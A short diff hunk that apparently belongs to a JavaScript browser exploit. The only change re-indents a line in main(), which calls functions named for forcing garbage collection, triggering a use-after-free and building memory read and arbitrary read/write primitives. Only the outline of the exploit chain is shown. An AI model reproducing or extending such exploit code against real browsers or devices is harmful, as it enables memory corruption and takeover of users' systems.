@@ -456,7 +456,7 @@ async function make_arw(reader, view2, pop) {
     make_arw._buffer = bt.buffer;
 }
 async function main() {
-		await forceGC();
+	await forceGC();
     const [fsets, indices] = prepare_uaf();
     const [view, [view2, pop]] = await uaf_ssv(fsets, indices[1], indices[0]);
     const rdr = await make_rdr(view);
